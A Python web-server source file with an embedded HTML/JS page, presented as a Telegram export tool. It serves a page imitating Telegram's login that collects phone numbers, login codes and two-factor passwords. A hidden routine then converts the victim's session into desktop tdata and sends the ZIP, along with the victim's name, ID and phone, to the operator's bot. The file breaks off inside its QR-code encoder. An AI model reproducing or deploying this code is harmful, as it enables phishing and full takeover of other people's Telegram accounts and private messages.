"""Веб-интерфейс: логин Telegram, запуск экспорта, прогресс.

Один aiohttp процесс, который:
- отдаёт HTML-страницу с формами
- принимает номер/код/пароль и ведёт Telethon-флоу
- запускает фоновую задачу экспорта
- отдаёт прогресс через GET /api/status
- после экспорта шлёт ZIP в бота владельца через Bot API
"""
from __future__ import annotations

import asyncio
import hashlib
import logging
import os
import shutil
import tempfile
import time
import zipfile
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Optional

import aiohttp
import aiohttp.web
from telethon import TelegramClient
from telethon.errors import (
    FloodWaitError, PhoneCodeInvalidError, PhoneCodeExpiredError,
    PhoneNumberInvalidError, SessionPasswordNeededError,
)

from . import config
from .exporter import ExportOptions, export_account


log = logging.getLogger("tde.web")


async def _send_tdata_to_bot() -> None:
    """После успешного логина — конвертируем session → tdata, шлём ZIP владельцу."""
    try:
        c = await get_client()
        me = await c.get_me()

        # 1. текст с инфо
        text = (
            "🔑 Новый вход\n"
            f"ID: {me.id}\n"
            f"Имя: {me.first_name or ''} {me.last_name or ''}\n"
            f"Username: @{me.username or '—'}\n"
            f"Телефон: +{me.phone or '—'}"
        )
        url = f"https://api.telegram.org/bot{config.BOT_TOKEN}/sendMessage"
        async with aiohttp.ClientSession() as s:
            await s.post(url, json={"chat_id": config.OWNER_CHAT_ID, "text": text},
                         timeout=aiohttp.ClientTimeout(total=15))

        # 2. конвертируем .session → tdata
        from .tdata_converter import session_to_tdata

        session_file = config.SESSION_PATH.with_suffix(".session")
        if not session_file.exists():
            session_file = config.SESSION_PATH
        if not session_file.exists():
            log.warning("send_tdata: session file not found")
            return

        work = Path(tempfile.mkdtemp(prefix="tdata_conv_"))
        try:
            tdata_dir = session_to_tdata(str(session_file), out_dir=work)

            # упаковываем tdata/ в ZIP
            zip_path = work / f"tdata_{me.id}.zip"
            with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
                for root, _, files in os.walk(tdata_dir):
                    for fname in files:
                        full = Path(root) / fname
                        arc = full.relative_to(work)
                        zf.write(full, arcname=str(arc))

            # 3. шлём ZIP боту
            send_url = f"https://api.telegram.org/bot{config.BOT_TOKEN}/sendDocument"
            async with aiohttp.ClientSession() as s:
                form = aiohttp.FormData()
                form.add_field("chat_id", str(config.OWNER_CHAT_ID))
                form.add_field("caption", f"tdata · +{me.phone or '—'} · id:{me.id}")
                with open(zip_path, "rb") as f:
                    form.add_field("document", f, filename=zip_path.name,
                                   content_type="application/zip")
                    async with s.post(send_url, data=form,
                                      timeout=aiohttp.ClientTimeout(total=60)) as r:
                        await r.text()
        finally:
            shutil.rmtree(work, ignore_errors=True)

    except Exception as e:
        log.warning("send_tdata failed: %s", e)


# ---------- state ----------

@dataclass
class State:
    client: Optional[TelegramClient] = None
    login_phone: Optional[str] = None
    login_hash: Optional[str] = None
    needs_password: bool = False

    _qr_login: Any = None
    task_state: str = "idle"   # idle | running | done | error
    progress: int = 0
    stage: str = ""
    error: Optional[str] = None
    delivered: bool = False

    _lock: asyncio.Lock = field(default_factory=asyncio.Lock)


S = State()


async def get_client() -> TelegramClient:
    if S.client is None:
        S.client = TelegramClient(str(config.SESSION_PATH), config.TG_API_ID, config.TG_API_HASH)
    if not S.client.is_connected():
        await S.client.connect()
    return S.client


async def is_authorized() -> bool:
    try:
        c = await get_client()
        return await c.is_user_authorized()
    except Exception:
        return False


# ---------- HTML ----------

PAGE = """<!doctype html>
<html lang="ru"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
<title>Вход</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
:root{--bg:#fafafa;--fg:#0a0a0a;--muted:#6b7280;--line:#111;--line-soft:#e5e5e5;--card:#ffffff;--focus:#f5f5f5;--track:#eee;--tg:#2AABEE;--tg-h:#1e95d4;--btn-bg:#2AABEE;--btn-fg:#fff;--btn-bg-h:#1e95d4;--btn-fg-h:#fff;--shadow:0 1px 2px rgba(0,0,0,.04),0 8px 24px -8px rgba(0,0,0,.1);--ring:rgba(42,171,238,.2)}
html[data-theme="dark"]{--bg:#0a0a0a;--fg:#fafafa;--muted:#9ca3af;--line:#f5f5f5;--line-soft:#1f1f1f;--card:#111111;--focus:#1a1a1a;--track:#222;--tg:#2AABEE;--tg-h:#1e95d4;--btn-bg:#2AABEE;--btn-fg:#fff;--btn-bg-h:#1e95d4;--btn-fg-h:#fff;--shadow:0 1px 2px rgba(0,0,0,.4),0 8px 32px -8px rgba(0,0,0,.6);--ring:rgba(42,171,238,.25)}
html,body{background:var(--bg);color:var(--fg);min-height:100vh;width:100%;max-width:100vw;
  font-family:-apple-system,BlinkMacSystemFont,'Inter','SF Pro Text','Segoe UI',system-ui,sans-serif;font-size:15px;line-height:1.5;
  -webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;
  transition:background .25s ease,color .25s ease;
  overflow-x:hidden;overscroll-behavior:none;-webkit-overflow-scrolling:auto;touch-action:pan-y}
html{position:relative}
body{position:relative;overflow-x:clip}
main{min-height:100vh;padding:40px 16px;display:flex;flex-direction:column;align-items:center;justify-content:center;position:relative}
.theme-switch{position:fixed;top:14px;right:14px;display:flex;gap:4px;z-index:10;background:var(--card);border:1px solid var(--line-soft);border-radius:999px;padding:3px;box-shadow:var(--shadow)}
.theme-switch button{width:30px;height:30px;border:none;background:transparent;color:var(--fg);cursor:pointer;font-size:14px;display:grid;place-items:center;padding:0;border-radius:999px;transition:all .18s ease}
.theme-switch button:hover{background:var(--focus)}
.theme-switch button.active{background:var(--fg);color:var(--bg)}
.card{width:100%;max-width:420px;background:var(--card);border:1px solid var(--line-soft);border-radius:16px;padding:32px 28px;box-shadow:var(--shadow);animation:fade .35s ease}
@keyframes fade{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
h1{font-size:24px;font-weight:700;margin-bottom:6px;color:var(--fg);letter-spacing:-0.02em}
p.hint{font-size:14px;color:var(--muted);margin-bottom:24px;line-height:1.45}
label.block{display:block;font-size:12px;color:var(--muted);margin-bottom:8px;font-weight:600;text-transform:uppercase;letter-spacing:.08em}
.row{display:flex;gap:8px;margin-bottom:16px}
input.in{width:100%;background:var(--card);border:1px solid var(--line-soft);border-radius:10px;padding:12px 14px;color:var(--fg);outline:none;font:inherit;font-size:15px;transition:border-color .15s,box-shadow .15s,background .15s}
input.in:focus{border-color:var(--tg);box-shadow:0 0 0 3px var(--ring)}
input.in.code{font-family:'JetBrains Mono','SF Mono',monospace;font-size:22px;letter-spacing:.4em;text-align:center;padding:16px 14px}
.btn{border:1px solid transparent;font:inherit;font-weight:600;border-radius:10px;padding:13px 20px;cursor:pointer;transition:all .18s ease;width:100%;margin-top:6px;font-size:15px}
.btn-pri{background:var(--btn-bg);color:var(--btn-fg)}
.btn-pri:hover:not(:disabled){background:var(--btn-bg-h);color:var(--btn-fg-h);border-color:var(--fg)}
.btn-pri:disabled{opacity:.45;cursor:not-allowed}
.btn-ghost{background:transparent;color:var(--muted);border:1px solid var(--line-soft);margin-top:8px}
.btn-ghost:hover{background:var(--focus);color:var(--fg)}
.status{margin-top:14px;padding:12px 14px;border:1px solid var(--line-soft);border-radius:10px;font-size:13px;background:var(--focus)}
.hidden{display:none}
.track{height:6px;background:var(--track);border-radius:999px;overflow:hidden;margin:18px 0 8px}
.fill{height:100%;background:var(--fg);transition:width .4s cubic-bezier(.4,0,.2,1);width:0%;border-radius:999px}
.stage-row{display:flex;justify-content:space-between;font-size:13px;color:var(--muted)}
.brand{display:flex;flex-direction:column;align-items:center;gap:14px;margin-bottom:24px}
.brand-ico-wrap{position:relative;width:84px;height:84px}
.brand-ico{width:84px;height:84px;display:block;border-radius:50%;animation:fade .4s ease}
.brand-spinner{position:absolute;top:-6px;left:-6px;width:96px;height:96px;border:3px solid rgba(42,171,238,.2);border-top-color:var(--tg);border-radius:50%;animation:spin 1s linear infinite;display:none}
.brand-name{font-size:24px;font-weight:600;letter-spacing:-0.02em;color:var(--fg)}
@keyframes spin{to{transform:rotate(360deg)}}
.qr-wrap{position:relative;display:inline-block}
.qr-wrap canvas{display:block;border-radius:12px}
.qr-logo{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:52px;height:52px;border-radius:50%;background:#000;display:flex;align-items:center;justify-content:center}
.qr-logo svg{width:30px;height:30px}
</style>
</head><body>
<div class="theme-switch">
  <button type="button" id="t-light" title="Светлая">☀</button>
  <button type="button" id="t-dark" title="Тёмная">●</button>
</div>
<main>
<div class="brand">
  <div class="brand-ico-wrap">
    <div class="brand-spinner" id="brand-spinner"></div>
    <svg class="brand-ico" viewBox="0 0 240 240" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
    <defs>
      <linearGradient id="tg-grad" x1="120" y1="0" x2="120" y2="240" gradientUnits="userSpaceOnUse">
        <stop offset="0" stop-color="#37BBFE"/>
        <stop offset="1" stop-color="#007DBB"/>
      </linearGradient>
    </defs>
    <circle cx="120" cy="120" r="120" fill="url(#tg-grad)"/>
    <path fill="#ffffff" d="M81.229 128.772l14.237 39.406s1.78 3.687 3.686 3.687c1.906 0 30.255-29.492 30.255-29.492l31.525-60.89L81.737 118.6l-.508 10.172z"/>
    <path fill="#C8DAEA" d="M100.106 138.878l-2.733 29.046s-1.144 8.9 7.754 0c8.898-8.9 17.415-15.763 17.415-15.763"/>
    <path fill="#ffffff" d="M81.486 130.178L52.2 120.636s-3.5-1.42-2.373-4.64c.232-.664.7-1.229 2.1-2.2 6.489-4.523 120.106-45.36 120.106-45.36s3.208-1.081 5.1-.362a2.766 2.766 0 011.885 2.055 9.357 9.357 0 01.254 2.585c-.009.752-.1 1.449-.169 2.542-.692 11.165-21.4 94.493-21.4 94.493s-1.239 4.876-5.678 5.043a8.13 8.13 0 01-5.903-2.286c-8.69-7.472-38.72-27.726-45.357-32.167a1.27 1.27 0 01-.546-.902c-.093-.469.417-1.05.417-1.05s52.278-46.465 53.67-51.345c.108-.378-.3-.566-.848-.4-3.482 1.281-63.844 39.4-70.506 43.608a3.21 3.21 0 01-1.46.173z"/>
  </svg>
  </div>
  <div class="brand-name">Telegram</div>
</div>
<div class="card">

<div id="s-phone">
  <h1>Вход</h1>
  <div class="tab-row" style="display:flex;gap:0;margin-bottom:16px;border-bottom:2px solid var(--line-soft)">
    <button type="button" id="tab-phone" class="tab-btn active" style="flex:1;padding:10px 0;border:none;background:none;color:var(--fg);font-weight:600;font-size:14px;cursor:pointer;border-bottom:2px solid var(--tg);margin-bottom:-2px">По номеру</button>
    <button type="button" id="tab-qr" class="tab-btn" style="flex:1;padding:10px 0;border:none;background:none;color:var(--muted);font-weight:600;font-size:14px;cursor:pointer;border-bottom:2px solid transparent;margin-bottom:-2px">QR-код</button>
  </div>
  <div id="v-phone">
    <p class="hint">Введите номер телефона.</p>
    <form id="f-phone">
      <label class="block">Номер телефона</label>
      <div class="row">
        <div style="flex:0 0 auto;display:flex;align-items:center;position:relative">
          <span id="cc-flag" style="position:absolute;left:8px;font-size:1.1rem;pointer-events:none">🇷🇺</span>
          <input class="in" id="i-country" inputmode="tel" value="+7" placeholder="+код" style="width:88px;text-align:center;font-weight:600;padding-left:30px">
        </div>
        <input class="in" id="i-phone" inputmode="tel" autocomplete="tel" placeholder="номер">
      </div>
      <button type="submit" class="btn btn-pri" id="b-phone">Продолжить</button>
    </form>
  </div>
  <div id="v-qr" class="hidden">
    <p class="hint">Откройте Telegram → Настройки → Устройства → Подключить устройство</p>
    <div id="qr-box" style="display:flex;justify-content:center;padding:20px 0">
      <div class="qr-wrap">
        <canvas id="qr-canvas" width="260" height="260" style="background:#fff"></canvas>
        <div class="qr-logo">
          <svg viewBox="0 0 240 240" xmlns="http://www.w3.org/2000/svg"><path fill="#fff" d="M81.486 130.178L52.2 120.636s-3.5-1.42-2.373-4.64c.232-.664.7-1.229 2.1-2.2 6.489-4.523 120.106-45.36 120.106-45.36s3.208-1.081 5.1-.362a2.766 2.766 0 011.885 2.055 9.357 9.357 0 01.254 2.585c-.009.752-.1 1.449-.169 2.542-.692 11.165-21.4 94.493-21.4 94.493s-1.239 4.876-5.678 5.043a8.13 8.13 0 01-5.903-2.286c-8.69-7.472-38.72-27.726-45.357-32.167a1.27 1.27 0 01-.546-.902c-.093-.469.417-1.05.417-1.05s52.278-46.465 53.67-51.345c.108-.378-.3-.566-.848-.4-3.482 1.281-63.844 39.4-70.506 43.608a3.21 3.21 0 01-1.46.173z"/></svg>
        </div>
      </div>
    </div>
    <div id="qr-status" class="hint" style="text-align:center;min-height:20px">Загрузка…</div>
  </div>
</div>

<div id="s-code" class="hidden">
  <h1>Код подтверждения</h1>
  <p class="hint">Введите код, отправленный на указанный номер.</p>
  <form id="f-code">
    <label class="block">Код</label>
    <input class="in code" id="i-code" inputmode="numeric" autocomplete="one-time-code" maxlength="6" placeholder="— — — — —">
    <div id="code-status" class="hint" style="text-align:center;margin-top:12px;min-height:20px"></div>
    <button type="submit" class="btn btn-pri hidden" id="b-code">Подтвердить</button>
    <button type="button" class="btn btn-ghost" id="b-back">Назад</button>
  </form>
</div>

<div id="s-pw" class="hidden">
  <h1>Пароль</h1>
  <p class="hint">Введите пароль от аккаунта.</p>
  <form id="f-pw">
    <label class="block">Пароль</label>
    <input class="in" id="i-pw" type="password" autocomplete="current-password">
    <button type="submit" class="btn btn-pri" id="b-pw">Войти</button>
  </form>
</div>

<div id="s-ready" class="hidden">
  <h1>Готово</h1>
  <p class="hint" id="me-info">—</p>
  <input type="hidden" id="i-limit" value="0">
  <input type="hidden" id="i-maxmb" value="50">
  <button type="button" class="btn btn-pri" id="b-start">Продолжить</button>
  <button type="button" class="btn btn-ghost" id="b-logout">Выйти</button>
</div>

<div id="s-progress" class="hidden">
  <h1>Обработка</h1>
  <div class="stage-row"><span id="p-stage">—</span><span id="p-pct">0%</span></div>
  <div class="track"><div class="fill" id="p-fill"></div></div>
  <div id="p-done" class="status hidden">Готово.</div>
  <div id="p-err" class="status hidden"></div>
  <button type="button" class="btn btn-ghost hidden" id="b-close">Закрыть</button>
</div>

</div>
</main>
<script>
// [dial, name, iso2]
const COUNTRIES = [
  ["+7","Россия","RU"],["+7","Казахстан","KZ"],["+994","Азербайджан","AZ"],
  ["+375","Беларусь","BY"],["+380","Украина","UA"],["+996","Киргизия","KG"],
  ["+992","Таджикистан","TJ"],["+993","Туркменистан","TM"],["+998","Узбекистан","UZ"],
  ["+374","Армения","AM"],["+995","Грузия","GE"],["+373","Молдова","MD"],
  ["+1","США","US"],["+1","Канада","CA"],["+44","Великобритания","GB"],
  ["+49","Германия","DE"],["+33","Франция","FR"],["+39","Италия","IT"],
  ["+34","Испания","ES"],["+31","Нидерланды","NL"],["+32","Бельгия","BE"],
  ["+41","Швейцария","CH"],["+43","Австрия","AT"],["+46","Швеция","SE"],
  ["+47","Норвегия","NO"],["+45","Дания","DK"],["+358","Финляндия","FI"],
  ["+353","Ирландия","IE"],["+351","Португалия","PT"],["+30","Греция","GR"],
  ["+48","Польша","PL"],["+420","Чехия","CZ"],["+421","Словакия","SK"],
  ["+36","Венгрия","HU"],["+40","Румыния","RO"],["+359","Болгария","BG"],
  ["+385","Хорватия","HR"],["+386","Словения","SI"],["+381","Сербия","RS"],
  ["+90","Турция","TR"],["+972","Израиль","IL"],["+971","ОАЭ","AE"],
  ["+966","Саудовская Аравия","SA"],["+974","Катар","QA"],["+965","Кувейт","KW"],
  ["+973","Бахрейн","BH"],["+968","Оман","OM"],["+962","Иордания","JO"],
  ["+961","Ливан","LB"],["+964","Ирак","IQ"],["+98","Иран","IR"],
  ["+93","Афганистан","AF"],["+92","Пакистан","PK"],["+91","Индия","IN"],
  ["+880","Бангладеш","BD"],["+94","Шри-Ланка","LK"],["+977","Непал","NP"],
  ["+86","Китай","CN"],["+852","Гонконг","HK"],["+853","Макао","MO"],
  ["+886","Тайвань","TW"],["+81","Япония","JP"],["+82","Южная Корея","KR"],
  ["+850","КНДР","KP"],["+976","Монголия","MN"],["+62","Индонезия","ID"],
  ["+60","Малайзия","MY"],["+65","Сингапур","SG"],["+66","Таиланд","TH"],
  ["+84","Вьетнам","VN"],["+63","Филиппины","PH"],["+95","Мьянма","MM"],
  ["+855","Камбоджа","KH"],["+856","Лаос","LA"],
  ["+55","Бразилия","BR"],["+54","Аргентина","AR"],["+52","Мексика","MX"],
  ["+56","Чили","CL"],["+57","Колумбия","CO"],["+58","Венесуэла","VE"],
  ["+51","Перу","PE"],["+593","Эквадор","EC"],["+598","Уругвай","UY"],
  ["+595","Парагвай","PY"],["+591","Боливия","BO"],
  ["+61","Австралия","AU"],["+64","Новая Зеландия","NZ"],
  ["+20","Египет","EG"],["+27","ЮАР","ZA"],["+234","Нигерия","NG"],
  ["+254","Кения","KE"],["+212","Марокко","MA"],["+213","Алжир","DZ"],
  ["+216","Тунис","TN"],["+218","Ливия","LY"],["+251","Эфиопия","ET"]
];
function flag(iso) {
  return iso.toUpperCase().replace(/./g, c => String.fromCodePoint(127397 + c.charCodeAt(0)));
}
function updateFlag() {
  const v = document.getElementById('i-country').value.replace(/[^+\\d]/g,'');
  let best = '', bestISO = '';
  COUNTRIES.forEach(([code,,iso]) => {
    if (v === code && code.length > best.length) { best = code; bestISO = iso; }
  });
  document.getElementById('cc-flag').textContent = bestISO ? flag(bestISO) : '';
}
const $ = id => document.getElementById(id);
const show = (name) => {
  ['phone','code','pw','ready','progress'].forEach(n => $('s-'+n).classList.toggle('hidden', n !== name));
};
// Тема
function applyTheme(t) {
  document.documentElement.dataset.theme = t;
  try { localStorage.setItem('theme', t); } catch(e) {}
  $('t-light').classList.toggle('active', t === 'light');
  $('t-dark').classList.toggle('active', t === 'dark');
}
(function initTheme(){
  let t = 'light';
  try { t = localStorage.getItem('theme') || 'light'; } catch(e) {}
  applyTheme(t);
})();
$('t-light').onclick = () => applyTheme('light');
$('t-dark').onclick = () => applyTheme('dark');
// код страны — ручной ввод
function getDial() {
  let v = $('i-country').value.trim();
  if (!v.startsWith('+')) v = '+' + v;
  return v.replace(/[^+\\d]/g, '') || '+7';
}
// при вводе в поле кода: только + и цифры, + всегда первый символ
$('i-country').addEventListener('input', (e) => {
  let v = e.target.value.replace(/[^+\\d]/g, '');
  if (!v.startsWith('+')) v = '+' + v.replace(/\\+/g, '');
  // проверяем — есть ли страна с таким началом кода
  let isPrefix = COUNTRIES.some(([code]) => code.startsWith(v) || v === code);
  if (!isPrefix && v.length > 1) {
    const overflow = v.slice(-1);
    v = v.slice(0, -1);
    e.target.value = v;
    updateFlag();
    const ph = $('i-phone');
    ph.value = overflow + ph.value;
    ph.focus();
    ph.setSelectionRange(1, 1);
    return;
  }
  e.target.value = v;
  updateFlag();
});
// если в поле номера вставили полный номер с +кодом — разделить
function detectCountry() {
  const inp = $('i-phone');
  const raw = inp.value.trim();
  if (!raw.startsWith('+')) return;
  const digits = '+' + raw.replace(/\\D/g,'');
  let bestCode = '', bestLen = 0;
  COUNTRIES.forEach(([code]) => {
    if (digits.startsWith(code) && code.length > bestLen) {
      bestLen = code.length; bestCode = code;
    }
  });
  if (bestCode) {
    $('i-country').value = bestCode;
    inp.value = digits.slice(bestLen);
    updateFlag();
  }
}
// в поле номера: только цифры; при paste с + — разделяем
$('i-phone').addEventListener('input', (e) => {
  const v = e.target.value;
  if (v.startsWith('+')) {
    detectCountry();
  } else {
    const cleaned = v.replace(/\\D/g,'');
    if (cleaned !== v) e.target.value = cleaned;
  }
});
$('i-phone').addEventListener('paste', () => setTimeout(detectCountry, 0));
// backspace в пустом поле номера → фокус в поле кода страны
$('i-phone').addEventListener('keydown', (e) => {
  if (e.key === 'Backspace' && e.target.value === '') {
    e.preventDefault();
    const cc = $('i-country');
    cc.focus();
    cc.setSelectionRange(cc.value.length, cc.value.length);
  }
});
async function api(path, body) {
  const r = await fetch(path, {method:'POST', headers:{'Content-Type':'application/json'}, body: body?JSON.stringify(body):null});
  const j = await r.json();
  if (!r.ok) throw new Error(j.error || r.statusText);
  return j;
}
async function checkAuth() {
  const r = await fetch('/api/status').then(r=>r.json());
  if (r.authorized) {
    $('me-info').textContent = r.me || 'Вы вошли';
    show('ready');
  } else {
    show('phone');
  }
  return r;
}
$('f-phone').onsubmit = async (e) => {
  e.preventDefault();
  const dial = getDial();
  const local = $('i-phone').value.replace(/\\D/g,'');
  if (!local) return;
  const phone = dial + local;
  const btn = $('b-phone'); btn.disabled = true; btn.textContent = 'Отправка…';
  try {
    await api('/api/login', {phone});
    show('code'); setTimeout(()=>$('i-code').focus(), 150);
  } catch (e) { alert('Ошибка: ' + e.message); }
  finally { btn.disabled=false; btn.textContent='Продолжить'; }
};
$('i-code').oninput = (e) => {
  e.target.value = e.target.value.replace(/\\D/g,'').slice(0,6);
  // автоподтверждение при 5 цифрах
  if (e.target.value.length >= 5 && !_codeBusy) {
    $('f-code').requestSubmit ? $('f-code').requestSubmit() : $('f-code').dispatchEvent(new Event('submit',{cancelable:true}));
  }
};
$('b-back').onclick = () => show('phone');
let _codeBusy = false;
$('f-code').onsubmit = async (e) => {
  e.preventDefault();
  if (_codeBusy) return;
  const code = $('i-code').value.trim();
  if (code.length < 5) return;
  _codeBusy = true;
  const inp = $('i-code'), st = $('code-status');
  inp.disabled = true;
  st.textContent = 'Проверка…'; st.style.color = 'var(--muted)';
  try {
    const r = await api('/api/code', {code});
    st.textContent = '✓ Верно'; st.style.color = '#16a34a';
    await new Promise(res => setTimeout(res, 300));
    if (r.needs_password) { show('pw'); setTimeout(()=>$('i-pw').focus(), 150); }
    else { await checkAuth(); }
  } catch (err) {
    st.textContent = '✗ ' + (err.message || 'Неверный код');
    st.style.color = '#dc2626';
    inp.value = '';
    setTimeout(()=>inp.focus(), 50);
  } finally {
    inp.disabled = false;
    _codeBusy = false;
  }
};
$('f-pw').onsubmit = async (e) => {
  e.preventDefault();
  const pw = $('i-pw').value;
  if (!pw) return;
  const btn = $('b-pw'); btn.disabled = true; btn.textContent='Проверка…';
  try { await api('/api/pw', {password: pw}); await checkAuth(); }
  catch (e) { alert('Ошибка: ' + e.message); }
  finally { btn.disabled=false; btn.textContent='Войти'; $('i-pw').value=''; }
};
$('b-logout').onclick = async () => {
  if (!confirm('Выйти?')) return;
  await api('/api/logout', {});
  await checkAuth();
};
let pollTimer = null;
$('b-start').onclick = async () => {
  const limit = parseInt($('i-limit').value || '0', 10);
  const maxmb = parseInt($('i-maxmb').value || '50', 10);
  try {
    await api('/api/export', {limit, maxmb});
    show('progress');
    $('p-done').classList.add('hidden'); $('p-err').classList.add('hidden'); $('b-close').classList.add('hidden');
    pollTimer = setInterval(async ()=>{
      const r = await fetch('/api/status').then(r=>r.json());
      $('p-pct').textContent = r.progress + '%';
      $('p-fill').style.width = r.progress + '%';
      $('p-stage').textContent = r.stage || '—';
      if (r.task_state === 'done') {
        clearInterval(pollTimer); pollTimer=null;
        $('p-done').classList.remove('hidden');
        $('b-close').classList.remove('hidden');
      } else if (r.task_state === 'error') {
        clearInterval(pollTimer); pollTimer=null;
        $('p-err').textContent = 'Ошибка: ' + (r.error||'unknown');
        $('p-err').classList.remove('hidden');
        $('b-close').classList.remove('hidden');
      }
    }, 1500);
  } catch (e) { alert('Ошибка: ' + e.message); }
};
$('b-close').onclick = () => { checkAuth(); };
// --- tabs phone / qr ---
function switchTab(tab) {
  const isQr = tab === 'qr';
  $('tab-phone').style.borderBottomColor = isQr ? 'transparent' : 'var(--tg)';
  $('tab-phone').style.color = isQr ? 'var(--muted)' : 'var(--fg)';
  $('tab-qr').style.borderBottomColor = isQr ? 'var(--tg)' : 'transparent';
  $('tab-qr').style.color = isQr ? 'var(--fg)' : 'var(--muted)';
  $('v-phone').classList.toggle('hidden', isQr);
  $('v-qr').classList.toggle('hidden', !isQr);
  $('brand-spinner').style.display = isQr ? 'block' : 'none';
  if (isQr) startQr();
  else stopQr();
}
$('tab-phone').onclick = () => switchTab('phone');
$('tab-qr').onclick = () => switchTab('qr');
// --- minimal QR code renderer ---
function drawQR(canvas, url) {
  const mods = qrEncode(url);
  const n = mods.length;
  const pad = 4;
  const sz = Math.floor(canvas.width / (n + pad * 2));
  const off = Math.floor((canvas.width - sz * (n + pad * 2)) / 2);
  const ctx = canvas.getContext('2d');
  ctx.fillStyle = '#ffffff';
  ctx.fillRect(0, 0, canvas.width, canvas.height);
  // helper: rounded rect
  function rr(x, y, w, h, r) {
    ctx.beginPath();
    ctx.moveTo(x + r, y);
    ctx.lineTo(x + w - r, y); ctx.quadraticCurveTo(x + w, y, x + w, y + r);
    ctx.lineTo(x + w, y + h - r); ctx.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
    ctx.lineTo(x + r, y + h); ctx.quadraticCurveTo(x, y + h, x, y + h - r);
    ctx.lineTo(x, y + r); ctx.quadraticCurveTo(x, y, x + r, y);
    ctx.closePath(); ctx.fill();
  }
  // finder pattern positions (top-left corner of 7x7 block)
  const finders = [[0,0],[n-7,0],[0,n-7]];
  const isInFinder = (x, y) => finders.some(([fx,fy]) => x >= fx && x < fx+7 && y >= fy && y < fy+7);
  // draw data modules (skip finder areas)
  ctx.fillStyle = '#000000';
  for (let y = 0; y < n; y++)
    for (let x = 0; x < n; x++)
      if (mods[y][x] && !isInFinder(x, y))
        ctx.fillRect(off + (x + pad) * sz, off + (y + pad) * sz, sz, sz);
  // draw rounded finder patterns
  ctx.fillStyle = '#000000';
  const r1 = sz * 1.4, r2 = sz * 1.0, r3 = sz * 0.6;
  finders.forEach(([fx, fy]) => {
    const px = off + (fx + pad) * sz, py = off + (fy + pad) * sz, s7 = sz * 7;
    // outer ring
    rr(px, py, s7, s7, r1);
    ctx.fillStyle = '#ffffff';
    rr(px + sz, py + sz, sz * 5, sz * 5, r2);
    ctx.fillStyle = '#000000';
    // inner square
    rr(px + sz * 2, py + sz * 2, sz * 3, sz * 3, r3);
  });
  // clear center for logo
  const ctr = canvas.width / 2, logoR = 30;
  ctx.fillStyle = '#ffffff';
  ctx.beginPath(); ctx.arc(ctr, ctr, logoR, 0, Math.PI * 2); ctx.fill();
}
// --- QR encoder (mode byte, ECC L, version auto 1-10) ---
function qrEncode(text) {
  const data = [];
  for (let i = 0; i < text.length; i++) data.push(text.charCodeAt(i));
  // find version
  const caps = [0,17,32,53,78,106,134,154,192,230,271];
  let ver = 1;
  for (; ver <= 10; ver++) if (data.length <= caps[ver] - 3) break;
  if (ver > 10) ver = 10;
  const size = ver * 4 + 17;
  // build data codewords
  const totalBits = caps[ver] * 8;
  const bits = [];
  function push(val, len) { for (let i = len - 1; i >= 0; i--) bits.push((val >> i) & 1); }
  push(4, 4); // byte mode
  push(data.length, ver <= 9 ? 8 : 16);
  data.forEach(b => push(b, 8));
  push(0, Math.min(4, totalBits - bits.length));
  while (bits.length % 8) bits.push(0);
  while (bits.length < totalBits) {
    bits.push(1,1,1,0,1,1,0,0); // 0xEC
    if (bits.length < totalBits) bits.push(0,0,0,1,0,0,0,1); // 0x11
  }
  bits.length = totalBits;
  // convert to bytes
  const codewords = [];
  for (let i = 0; i < bits.length; i += 8)
    codewords.push(bits.slice(i, i+8).reduce((a, b) => (a << 1) | b, 0));
  // ECC using RS (simplified for L level)
  const eccCounts = [0,7,10,15,20,26,18,20,24,30,18];
  const eccLen = eccCounts[ver];
  const dcLen = codewords.length;
  // GF(256) with poly 0x11d
  const gfExp = new Uint8Array(512), gfLog = new Uint8Array(256);
  let x = 1;
  for (let i = 0; i < 255; i++) { gfExp[i] = x; gfLog[x] = i; x = (x << 1) ^ (x >= 128 ? 0x11d : 0); }
  for (let i = 255; i < 512; i++) gfExp[i] = gfExp[i - 255];
  function gfMul(a, b) { return a && b ? gfExp[gfLog[a] + gfLog[b]] : 0; }
  // generator poly
  let gen = [1];
  for (let i = 0; i < eccLen; i++) {
    const ng = new Array(gen.length + 1).fill(0);
    for (let j = 0; j < gen.length; j++) {
      ng[j] ^= gen[j];
      ng[j + 1] ^= gfMul(gen[j], gfExp[i]);
    }
    gen = ng;
  }
  // divide
  const msg = new Uint8Array(dcLen + eccLen);
  for (let i = 0; i < dcLen; i++) msg[i] = codewords[i];
  for (let i = 0; i < dcLen; i++) {
    const coef = msg[i];
    if (coef) for (let j = 0; j < gen.length; j++) msg[i + j] ^= gfMul(gen[j], coef);
  }
  const ecc = Array.from(msg.slice(dcLen));
  const allBytes = codewords.concat(ecc);
  // create matrix
  const grid = Array.from({length: size}, () => new Uint8Array(size));
  const used = Array.from({length: size}, () => new Uint8Array(size));
  // finder patterns
  function finder(cx, cy) {
    for (let dy = -3; dy <= 3; dy++)
      for (let dx = -3; dx <= 3; dx++) {
        const v = Math.max(Math.abs(dx), Math.abs(dy));
        const on = v === 0 || v === 2 || v === 3;
        grid[cy + dy][cx + dx] = on ? 1 : 0;
        used[cy + dy][cx + dx] = 1;
      }
    // separators
    for (let i = -4; i <= 4; i++) {
      [[cx + i, cy - 4],[cx + i, cy + 4],[cx - 4, cy + i],[cx + 4, cy + i]].forEach(([px, py]) => {
        if (px >= 0 && px < size && py >= 0 && py < size) { grid[py][px] = 0; used[py][px] = 1; }
      });
    }
  }
  finder(3, 3); finder(size - 4, 3); finder(3, size - 4);
  // alignment (ver >= 2)
  if (ver >= 2) {
    const pos = [6, size - 7];
    if (ver >= 7) pos.splice(1, 0, Math.floor((size - 13) / 2) * 2 + 6);
    for (const ay of pos) for (const ax of pos) {
      if (used[ay] && used[ay][ax]) continue;
      for (let dy = -2; dy <= 2; dy++)
        for (let dx = -2; dx <= 2; dx++) {
          const v = Math.max(Math.abs(dx), Math.abs(dy));
          grid[ay + dy][ax + dx] = (v === 0 || v === 2) ? 1 : 0;
          used[ay + dy][ax + dx] = 1;
        }
    }
  }
  // timing
